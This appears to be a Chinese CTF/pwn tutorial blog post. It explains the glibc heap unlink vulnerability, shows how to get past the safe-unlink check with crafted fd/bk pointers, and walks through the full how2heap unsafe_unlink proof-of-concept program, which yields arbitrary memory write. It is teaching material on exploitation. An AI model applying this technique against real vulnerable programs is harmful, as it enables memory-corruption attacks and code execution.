---
title: unlink漏洞的原理和利用
url: 651.html
id: 651
categories:
  - hack_ctf
date: 2017-12-14 09:50:26
tags:
  - binary
  - unlink
  - pwn
---


#### 0x1 前言

网上关于unlink漏洞的文章已经非常多了，但是作为一个web狗，为了搞明白这个漏洞，还是花了好长时间，中间踩了几个坑，写这篇文章是希望跟我一样啃二进制的web狗少走弯路。

<!--more-->

#### 0x2 unlink是什么 

unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。介绍unlink之前先的说一下linux系统中的堆块的结构(其实就是一个双向链表)：

由于篇幅的问题，这里不再详细说明linux的堆块管理过程，可以参考[这篇文章](http://www.freebuf.com/articles/system/104144.html),里面说的十分详细，但是有一些错误，至于哪里错了，自己调试调试就知道了。这里只说一下linux堆块的结构如如下图所示:
![http://pic.wonderkun.cc/uploads/2017/12/1.png](http://pic.wonderkun.cc/uploads/2017/12/1.png)

unlink的操作可以使用ctf-wiki的图可以很好描述：

![http://pic.wonderkun.cc/uploads/2017/12/2.png](http://pic.wonderkun.cc/uploads/2017/12/2.png)

其实最终就进行了一个在双向链表中删除节点P的操作，让P堆块和BK堆块合并成一个空闲堆块：

做的操作就是：

```c
p->fd->bk = p->bk
p->bk->fd = p->fd
```

#### 0x3 未加防护机制的unlink

假如系统中有下图所示的两个堆块：

![http://pic.wonderkun.cc/uploads/2017/12/3.png](http://pic.wonderkun.cc/uploads/2017/12/3.png)

堆块Q和堆块P物理相邻，此时的堆块p已经处于空闲状态了。但是如果我们通过某种操作，比如说堆溢出或者写越界等，控制了堆块p的Fd指针的值和Bk指针的值，修改为我们想要的内容：让Fd=addr - 3*4, Bk = except value

**unlink漏洞的结果是在任意的可写地址写入任意你想写的内容，这里里面牵扯两个变量：第一个. 在什么地址写，第二个.写入什么内容**

**addr就表示任意一个你想控制的可写地址**

**except value 是你想在addr中写入的值**

下面就来看漏洞是怎么发生的，当我们free(Q)的时候，系统就发现Q堆块后面的P堆块也处于free状态，就会Q堆块和P堆块的合并操作。继而对堆块P进行unlink的操作，下面看一下unlink的操作过程（以32位系统说明问题）：
```
1. FD = P->fd = addr - 3*4 
2. BK = P->bk = except value
3. FD->bk =BK , 即  *(addr-3*4+3*4) = BK = except value
4. BK->fd =FD , 即  *(except value + 8) = FD = addr - 3*4
```
看到第三条，想必很多人都会有一个跟我一样的疑问。FD指向的位置，也就是（addr-3*4）这个地址的位置并不是一个堆块的起始地址，那么它怎么会有bk指针呢？ **其实在汇编中，根本没有结构体的概念，所有的一切都是偏移，要找FD的bk，其实就是就是找距离FD指针指向的地址的三个字的偏移的地方，所以访问的地址是(FD+3\*4)**

这样我们就可以实现在任意可写地址addr中写入except value这样一个值了。但是还需要注意:**expect value +8 地址具有可写的权限，不会导致程序崩溃**，这样就产生了一个任意地址写的漏洞。

#### 0x4 加了防护机制的unlink

unlink其实是libc中malloc.c文件中的一个宏定义，代码如下(P代表当前堆块，FD代表下一个堆块,BK代表前一个堆块)：

```c
#define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                                          \
    BK = P->bk;                                                          \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
      malloc_printerr (check_action, "corrupted double-linked list", P); \
    else {                                                               \
      FD->bk = BK;                                                       \
      BK->fd = FD;                                                       \
      if (!in_smallbin_range (P->size)				       \
      && __builtin_expect (P->fd_nextsize != NULL, 0)) {	       \
        assert (P->fd_nextsize->bk_nextsize == P);		       \
        assert (P->bk_nextsize->fd_nextsize == P);		       \
        if (FD->fd_nextsize == NULL) {				       \
      if (P->fd_nextsize == P)				       \
        FD->fd_nextsize = FD->bk_nextsize = FD;		       \
      else {							       \
        FD->fd_nextsize = P->fd_nextsize;			       \
        FD->bk_nextsize = P->bk_nextsize;			       \
        P->fd_nextsize->bk_nextsize = FD;			       \
        P->bk_nextsize->fd_nextsize = FD;			       \
      }							       \
        }	else {							       \
      P->fd_nextsize->bk_nextsize = P->bk_nextsize;		       \
      P->bk_nextsize->fd_nextsize = P->fd_nextsize;		       \
        }								       \
      }								       \
    }                                                                    \
  }
```

可以看到添加了如下的防护机制：

```c
// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
      malloc_printerr (check_action, "corrupted double-linked list", P); \
    else {                                                               \
      FD->bk = BK;                                                       \
      BK->fd = FD;                                                       \
      if (!in_smallbin_range (P->size)				       \
      && __builtin_expect (P->fd_nextsize != NULL, 0)) {	       \
        assert (P->fd_nextsize->bk_nextsize == P);		       \
        assert (P->bk_nextsize->fd_nextsize == P);	
```

需要满足做到如下两点

```c
P->fd->bk=P
P->bk->fd=P
```

在看我们在0x3里面选的addr和except value，我们需要构造两个巧妙的值，才能绕过上面的防护。

但是addr和except value该怎么取呢？不妨就让他们相等，列出一个等式(注意下面不是赋值，是等式)，求解

```c
P->fd->bk =*（addr-3*4+3*4）=P    ==>  addr = &P 
P->bk->fd = *(except value + 2*4) = P => except value = &P-2*4  
```

**所以当我们把fd内容设置为(&P-3\*4)，把bk的内容设置为（&P-2\*4）的时候，就可以绕过这个安全检测机制 **。

接下里就是修改指针的内容了：

```c
p->fd->bk = p->bk
p->bk->fd = p->fd

因为 p->fd->bk=P->bk->fd = P
所以最后 P=&P-3*4 
```

也就是说，P指针本来是指向堆空间的，但是他现在它指向了比它地址小12的地方。假如说P指针是一个全局变量，是存在bss段的，那么我们就可以通过修改bss段的P指针实现对任意地址的读和写。

#### 0x5 分析unsafe unlink的代码，理解unlink漏洞 

unsafe unlinke的代码在这里：[https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c](https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;
	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");
	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'next_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) != False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);
}
```

1.申请两个大小为0x80的堆块:

```c
    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
```


2.在chunk0中构建一个伪的堆块，以chunk0_ptr为起始地址

```c
   chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
   chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
```

   ![http://pic.wonderkun.cc/uploads/2017/12/4.png](http://pic.wonderkun.cc/uploads/2017/12/4.png)
	 
3.修改chunk1的pre_chunk_size字段和size字段，以便于在free(chunk1)的时候，可以合并上面构造的那个伪块

```c
      header_size = 2
      uint64_t *chunk1_hdr = chunk1_ptr - header_size;
      chunk1_hdr[0] = malloc_size; //上一个堆块的大小，就是伪块的大小
      chunk1_hdr[1]&=~1;  //末位清零，最后一位为零表示上一个堆块是free状态，可以和它合并
```

   ![http://pic.wonderkun.cc/uploads/2017/12/5.png](http://pic.wonderkun.cc/uploads/2017/12/5.png)

   最后完整的布局图如下：

   ![http://pic.wonderkun.cc/uploads/2017/12/6.png](http://pic.wonderkun.cc/uploads/2017/12/6.png)
 4.在free(chunk1_ptr)之后，chunk0_ptr指向了&chunk0_ptr-3的地方

   ![http://pic.wonderkun.cc/uploads/2017/12/7.png](http://pic.wonderkun.cc/uploads/2017/12/7.png)

5.漏洞证明

```c
         chunk0_ptr[3] = (uint64_t) victim_string //其实就是chunk0_ptr[3] = &victim_string 
         chunk0_ptr[0] = 0x4141414142424242LL;
         printf("New Value: %s\n",victim_string);
```
         
修改chunk0_ptr[3]的值其实是在修改chunk0_ptr[3]指向的位置，让它指向vimtim_string.

然后修改chunk0_ptr[0]就修改了vimtim_string字符串本身。

也就是说我们通过修改chunk0_ptr[3]的值为我们想要修改的地址，就可以实现任意地址读写操作。